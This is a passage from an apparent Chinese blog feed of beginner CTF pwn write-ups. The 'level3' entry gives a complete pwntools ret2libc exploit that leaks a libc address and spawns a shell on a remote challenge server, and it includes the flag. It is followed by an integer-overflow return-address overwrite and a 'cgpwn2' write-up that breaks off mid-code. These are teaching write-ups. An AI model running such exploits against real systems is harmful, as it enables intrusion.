    <content type="html"><![CDATA[<p>libc中的函数相对于libc的基地址的偏移都是确定的，如果有一道题给你了libc的文件，就可以通过libc文件泄露出system函数和binsh的地址，然后再构造payload。</p><a id="more"></a><h1 id="攻防世界level3"><a href="#攻防世界level3" class="headerlink" title="攻防世界level3"></a>攻防世界level3</h1><blockquote><p>参考wp：<a href="https://bbs.pediy.com/thread-254858.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-254858.htm</a></p></blockquote><p><img src="https://s2.ax1x.com/2019/10/12/uXMRbj.png" alt="uXMRbj.png"></p><blockquote><p>下载下来后是个  .gz压缩包：<br><img src="https://s2.ax1x.com/2019/10/12/uXMgKg.png" alt="uXMgKg.png"><br><img src="https://s2.ax1x.com/2019/10/12/uXM2rQ.png" alt="uXM2rQ.png"><br>tar -zxvf level3.gz</p></blockquote><blockquote><p>Linux下的解压命令具体详见：<a href="https://www.cnblogs.com/midiyu/p/7875462.html" target="_blank" rel="noopener">https://www.cnblogs.com/midiyu/p/7875462.html</a></p></blockquote><h2 id="检查文件属性以及保护模式："><a href="#检查文件属性以及保护模式：" class="headerlink" title="检查文件属性以及保护模式："></a>检查文件属性以及保护模式：</h2><p><img src="https://s2.ax1x.com/2019/10/12/uXMfVs.png" alt="uXMfVs.png"></p><blockquote><p>简单执行下：<br><img src="https://s2.ax1x.com/2019/10/12/uXMhan.png" alt="uXMhan.png"></p></blockquote><h2 id="拖入IDA分析："><a href="#拖入IDA分析：" class="headerlink" title="拖入IDA分析："></a>拖入IDA分析：</h2><blockquote><p>首先查看字符串，之前已经说过这部对于我们信息采集很重要！，只有read和write，但没有看到system和bin/sh/<br><img src="https://s2.ax1x.com/2019/10/12/uXMIP0.png" alt="uXMIP0.png"></p></blockquote><h2 id="进入main函数："><a href="#进入main函数：" class="headerlink" title="进入main函数："></a>进入main函数：</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();                        <span class="comment">// 进去分析下</span></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Hello, World!\n"</span>, <span class="number">0xE</span>u);            <span class="comment">// 0xE   14</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//没有什么可疑的漏洞！</span></span><br></pre></td></tr></table></figure><h2 id="双击进入分析-vulnerable-function"><a href="#双击进入分析-vulnerable-function" class="headerlink" title="双击进入分析 vulnerable_function()"></a>双击进入分析 vulnerable_function()</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);                     <span class="comment">// 交互  1   输入字符串到 *buf指针处</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);                 <span class="comment">// 最大空间是0x88字节   但最大可以读取  0x100字节</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//OK，这里就是漏洞存在点了，缓冲区溢出！</span></span><br></pre></td></tr></table></figure><blockquote><p>有个清晰的思路，对于知识的而掌握会更加深刻，以后要在这方面多用点心！</p></blockquote><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">因为是<span class="built_in">system</span>函数和 bin/ <span class="keyword">sh</span>/在程序之外的libc_32.<span class="keyword">so</span>.<span class="number">6</span>库中！</span><br><span class="line">而我们的目标是执行 <span class="built_in">system</span>(bin/<span class="keyword">sh</span>/)</span><br><span class="line">达到我们的目标我们首先要 得到 <span class="built_in">system</span>()函数和bin/<span class="keyword">sh</span>/符号在运行时在内存中的地址！</span><br><span class="line"></span><br><span class="line">libc中的函数相对于libc的基地址的偏移都是确定的，如果有一道题给你了libc的文件，</span><br><span class="line">就可以通过libc文件泄露出<span class="built_in">system</span>函数和binsh的地址，然后再构造payload。</span><br></pre></td></tr></table></figure><ul><li>system函数在内存中的地址    =   libc_base_addr +system_libc_addr</li><li>bin/sh/符号在内存中的地址    =   libc_base_addr + binsh_libc_addr</li></ul><blockquote><p>以上呢，libc_base_addr和binsh_libc_addr我们是未知的，<br>于是我们需要做的就是  得到libc_base_addr   和 binsh_libc_addr</p></blockquote><h2 id="binsh在libc中的地址："><a href="#binsh在libc中的地址：" class="headerlink" title="binsh在libc中的地址："></a>binsh在libc中的地址：</h2><ol><li>可以直接搜索得到 binsh_libc = libc.search(‘/bin/sh’).next()</li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line">context.<span class="attribute">log</span>=<span class="string">'debug'</span></span><br><span class="line"><span class="attribute">libc</span>=ELF('./libc_32.so.6')</span><br><span class="line"><span class="attribute">binsh_libc_addr</span>=libc.search('/bin/sh').next()</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"%x"</span> %binsh_libc_addr</span><br><span class="line"><span class="builtin-name">print</span> hex(binsh_libc_addr)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/10/12/uXMoGV.png" alt="uXMoGV.png"><br>2. strings -a -t x libc_32.so.6 | grep “/bin/sh”<br><img src="https://s2.ax1x.com/2019/10/12/uXMbMF.png" alt="uXMbMF.png"></p><h2 id="libc-base-addr（libc基地址在真实内存中的地址）："><a href="#libc-base-addr（libc基地址在真实内存中的地址）：" class="headerlink" title="libc_base_addr（libc基地址在真实内存中的地址）："></a>libc_base_addr（libc基地址在真实内存中的地址）：</h2><blockquote><p>我们可以通过write_got_addr（write函数在got表中的真实（内存）的地址leak出来） - libc.symbols[‘write’]（write函数地址在libc中的偏移量）获得</p></blockquote><blockquote><p>而libc.symbols[‘write’]（write函数地址在libc中的偏移量），我们可以使用ELF模块的symbols成员函数获得，所以我们主要 向下如何获得write_got_addr（write函数在got表中的真实（内存）的地址leak出来）：</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">详细参考这个链接：</span><br><span class="line">通过给的libc泄露（write_got_addr）函数在真实内存的地址：https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/zszcr/</span>article<span class="regexp">/details/</span><span class="number">79659453</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/10/12/uXMT2T.png" alt="uXMT2T.png"></p><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><blockquote><p>于是我们刚好可以通过  vulnerable_function()函数中的buf缓冲区来得到write_got_addr，但我们好像没办法执行系统函数system(bin/sh/)了，<br>我们做pwn中缓冲区溢出漏洞，一般思路就是要覆盖返回地址，然后让他们去执行我们向栈中的shellcode，但因为这个程序开启了 NX保护，于是shellcode方法，就行不通了，我们通过return2libc来绕过！我们构造pay1时将函数返回地址继续返回到  能再次执行带write()函数的地址（这里取了main()函数，我试了下，取 vulnerable_function()也可以的），即我们在得到write_got_addr的同时又可以重新利用这个缓冲区漏洞，构造payload2system(bin/sh/)函数去执行，即制造 2次攻击！<br><img src="https://s2.ax1x.com/2019/10/12/uXMT2T.png" alt="uXMT2T.png"></p></blockquote><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line">context.<span class="attribute">log_level</span>=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh=process('./level3')</span></span><br><span class="line"><span class="attribute">sh</span>=remote('111.198.29.45','56479')</span><br><span class="line"><span class="attribute">elf</span>=ELF('./level3')</span><br><span class="line"><span class="attribute">libc</span>=ELF('./libc_32.so.6')</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用ELF模块的成员函数来获得write（）在程序内GOT地址和Vulnerable——function（）调用地址</span></span><br><span class="line"><span class="attribute">write_plt</span>=elf.plt[<span class="string">'write'</span>]</span><br><span class="line"><span class="comment">#print('%x' %write_plt)</span></span><br><span class="line"><span class="attribute">write_got</span>=elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="comment">#print('%x' %write_got)</span></span><br><span class="line"><span class="attribute">vulnerable_function_addr</span>=elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"><span class="comment">#print('%x' %main_addr)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = 'A'*0x88 + p32(0xdeadbeef) + p32(write_plt) + p32(vulnerable_function_addr) + p32(1) + p32(write_got) + p32(0xdeadbeef)</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'A'</span><span class="number">*0</span>x88 + p32(0xdeadbeef) + p32(write_plt) + p32(vulnerable_function_addr) + p32(1) + p32(write_got) + p32(0x4)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#leak write's addr in got</span></span><br><span class="line"><span class="comment">#write_got_addr = u32(sh.recv()[:4])</span></span><br><span class="line">write_got_addr = u32(sh.recv(4))</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">'write_got address is'</span>,hex(write_got_addr)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#leak libc's addr</span></span><br><span class="line">libc_addr = write_got_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">'libc address is'</span>,hex(libc_addr)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#get system's addr</span></span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">'system address is'</span>,hex(sys_addr)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#get bin/sh 's addr    strings -a -t x libc_32.so.6 | grep "/bin/sh"</span></span><br><span class="line"><span class="comment">#libc.search("/bin/sh").next()</span></span><br><span class="line">bin_sh_addr = libc_addr + 0x15902b</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">'/bin/sh address is'</span>,hex(bin_sh_addr)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#get second payload</span></span><br><span class="line">payload0 = <span class="string">'A'</span><span class="number">*0</span>x88 + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)</span><br><span class="line"> </span><br><span class="line">sh.sendline(payload0)</span><br><span class="line">sh.interactive()</span><br><span class="line">conn.recvall()#cyberpeace&#123;b033002e1b7fe92a83247b96ec733d1d&#125;</span><br></pre></td></tr></table></figure><h3 id="PLT与GOT的相关链接学习"><a href="#PLT与GOT的相关链接学习" class="headerlink" title="PLT与GOT的相关链接学习:"></a>PLT与GOT的相关链接学习:</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/linyt/</span>article<span class="regexp">/details/</span><span class="number">51635768</span></span><br><span class="line">https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/qq_18661257/</span>article<span class="regexp">/details/</span><span class="number">54694748</span></span><br><span class="line">https:<span class="regexp">//</span>delcoding.github.io<span class="regexp">/2018/</span><span class="number">11</span><span class="regexp">/got-plt-study/</span></span><br><span class="line">https:<span class="regexp">//</span>tinylab.gitbooks.io<span class="regexp">/cbook/</span>zh<span class="regexp">/chapters/</span><span class="number">02</span>-chapter4.html</span><br></pre></td></tr></table></figure><h3 id="参考wp："><a href="#参考wp：" class="headerlink" title="参考wp："></a>参考wp：</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//www</span>.cnblogs.com/tiumo/p/<span class="number">11484755</span>.html</span><br><span class="line">http:<span class="regexp">//www</span>.ctf-wp.com/<span class="number">2019</span>/<span class="number">06</span>/<span class="number">19</span>/%E7%AC%AC%E5%8D%81%E4%B8%80%E9%A2%98%EF%BC%9Alevel3/</span><br><span class="line">http:<span class="regexp">//winny</span>.work/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/<span class="number">377</span>.html<span class="comment">#toc-head-11</span></span><br><span class="line">http:<span class="regexp">//virgin</span>-forest.top/<span class="number">2019</span>/<span class="number">05</span>/<span class="number">19</span>/ctf-xman-level3-elf/<span class="comment">#more</span></span><br><span class="line">http:<span class="regexp">//www</span>.voidcn.com/article/p-efegxkkx-byy.html</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><blockquote><p>终于做完了，觉得这11道pwn新手题中，就数这题最麻烦，当然对于我这样新手菜鸡来说！慢慢来嘛！学习这东西，急不得的！，慢慢成长！</p></blockquote><p><a href="https://imgchr.com/i/uXYhC9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/12/uXYhC9.png" alt="uXYhC9.png"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;libc中的函数相对于libc的基地址的偏移都是确定的，如果有一道题给你了libc的文件，就可以通过libc文件泄露出system函数和binsh的地址，然后再构造payload。&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>国庆七天之pwn04</title>
    <link href="http://yoursite.com/2019/10/09/%E5%9B%BD%E5%BA%86%E4%B8%83%E5%A4%A9%E4%B9%8Bpwn04/"/>
    <id>http://yoursite.com/2019/10/09/国庆七天之pwn04/</id>
    <published>2019-10-09T15:57:25.000Z</published>
    <updated>2019-10-10T17:07:48.591Z</updated>
    
    <content type="html"><![CDATA[<p>新手区的pwn题还没有做完！明天要做完它！</p><a id="more"></a><h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><h2 id="检查文件属性及其保护："><a href="#检查文件属性及其保护：" class="headerlink" title="检查文件属性及其保护："></a>检查文件属性及其保护：</h2><blockquote><p>没有canary（栈），没有PIE（地址随机化）。<br><img src="https://s2.ax1x.com/2019/10/11/u7hJ6e.png" alt="u7hJ6e.png"></p></blockquote><h2 id="ida查看字符串"><a href="#ida查看字符串" class="headerlink" title="ida查看字符串"></a>ida查看字符串</h2><blockquote><p>我觉得这步真的挺重要得！留一下可能存在漏洞所在地方或者猜测下漏洞类型！<br><img src="https://s2.ax1x.com/2019/10/11/u7hlY6.png" alt="u7hlY6.png"></p></blockquote><h2 id="main-函数："><a href="#main-函数：" class="headerlink" title="main()函数："></a>main()函数：</h2><blockquote><p>流程很简单！（详见注释）</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"---------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"~~ Welcome to CTF! ~~"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       1.Login       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       2.Exit        "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"---------------------"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your choice:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);                    <span class="comment">// 交互1     选择 Login（1） 或者   Exit（2）</span></span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )                                <span class="comment">// 肯定输入  1 啊</span></span><br><span class="line">  &#123;</span><br><span class="line">    login();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Bye~"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Choice!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>main()函数中没有漏洞，肯定是在  login()函数中了!我们进去分析！</p></blockquote><h2 id="login-函数："><a href="#login-函数：" class="headerlink" title="login()函数："></a>login()函数：</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">login()函数</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-228h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+200h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your username:"</span>);          <span class="comment">// 交互 2  输入用户名到&amp;s处（0x19）</span></span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x19</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your passwd:"</span>);            <span class="comment">// 交互  3  输入我们的密码  &amp;buf 处（0x199）</span></span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x199</span>u);                        <span class="comment">// 留意下，0x199字节 空间 大的让人怀疑</span></span><br><span class="line">  <span class="keyword">return</span> check_passwd(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>然后我们进去check_passwd(&amp;buf)看下，然后再综合分析！</p></blockquote><h2 id="check-passwd-amp-buf-函数："><a href="#check-passwd-amp-buf-函数：" class="headerlink" title="check_passwd(&amp;buf)函数："></a>check_passwd(&amp;buf)函数：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数char *s 是 我们输入的Password字符串的指针</span></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">check_passwd</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h] v3 为无符号8(n)位整形数据，范围为：0-255，若大于255，取其2的8(n)模幂，类似与在0-255 中循环</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);                               <span class="comment">// v3 是我们输入Password的长度</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Password"</span>);</span><br><span class="line">    result = (<span class="keyword">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>                                          <span class="comment">// 3&lt;len(Password)&lt;=8  绕过if  进入 else</span></span><br><span class="line">  &#123;                                             <span class="comment">// 存在整数溢出： 3+256*x------8+256*x也可以</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(&amp;dest, s);                  <span class="comment">// 将Password 字符串 拷贝到  &amp;dest 地址</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>因为题目，是int_overflow，所以肯定就涉及到了整数溢出漏洞！见注释；</p></blockquote><blockquote><p>另外，我参考了这个 链接：<a href="https://en.m.wikipedia.org/wiki/Integer_overflow" target="_blank" rel="noopener">https://en.m.wikipedia.org/wiki/Integer_overflow</a><br>然后我们在栈中看下 dest得在栈中得结构及所占空间大小    </p></blockquote><h2 id="dest在堆栈的数据结构（空间）：0x14字节！"><a href="#dest在堆栈的数据结构（空间）：0x14字节！" class="headerlink" title="dest在堆栈的数据结构（空间）：0x14字节！"></a>dest在堆栈的数据结构（空间）：0x14字节！</h2><p><img src="https://s2.ax1x.com/2019/10/11/u7hQFx.png" alt="u7hQFx.png"></p><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><blockquote><p>根据8位无符号整数溢出漏洞，3&lt;len(Password)&lt;=8，亦可以是259&lt;len(Password)&lt;=264<br>想要覆盖到返回地址，先使用0x14 个数据覆盖stack拷贝的passed的内存区域，然后使用4字节数据覆盖ebp，再使用”cat flag”的地址覆盖返回地址，最后接上259-0x14-4-4&lt;len(Password)&lt;=264-0x14-4-4    231&lt;x&lt;=236剩余的数据即可。这里随便去了一个   235<br>构造exp：</p></blockquote><p><img src="https://s2.ax1x.com/2019/10/11/u7hKT1.png" alt="u7hKT1.png"></p><p><img src="https://s2.ax1x.com/2019/10/11/u7h8SO.png" alt="u7h8SO.png"></p><h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><h2 id="查看属性及其文件保护："><a href="#查看属性及其文件保护：" class="headerlink" title="查看属性及其文件保护："></a>查看属性及其文件保护：</h2><blockquote><blockquote><p>没有canary（栈），没有PIE（地址随机化）。<br><img src="https://s2.ax1x.com/2019/10/11/u7h1fK.png" alt="u7h1fK.png"></p></blockquote></blockquote><h2 id="ida-查看字符串："><a href="#ida-查看字符串：" class="headerlink" title="ida 查看字符串："></a>ida 查看字符串：</h2><blockquote><p>留意漏洞可能在的地方<br><img src="https://s2.ax1x.com/2019/10/11/u7hGlD.png" alt="u7hGlD.png"></p></blockquote><h2 id="进入main-函数："><a href="#进入main-函数：" class="headerlink" title="进入main()函数："></a>进入main()函数：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  hello();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"thank you"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里没有什么，我们进入hello()函数</p></blockquote><h2 id="hello-函数"><a href="#hello-函数" class="headerlink" title="hello()函数"></a>hello()函数</h2><blockquote><p>详见注释：</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+12h] [ebp-26h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+14h] [ebp-24h]</span></span><br><span class="line"></span><br><span class="line">  v0 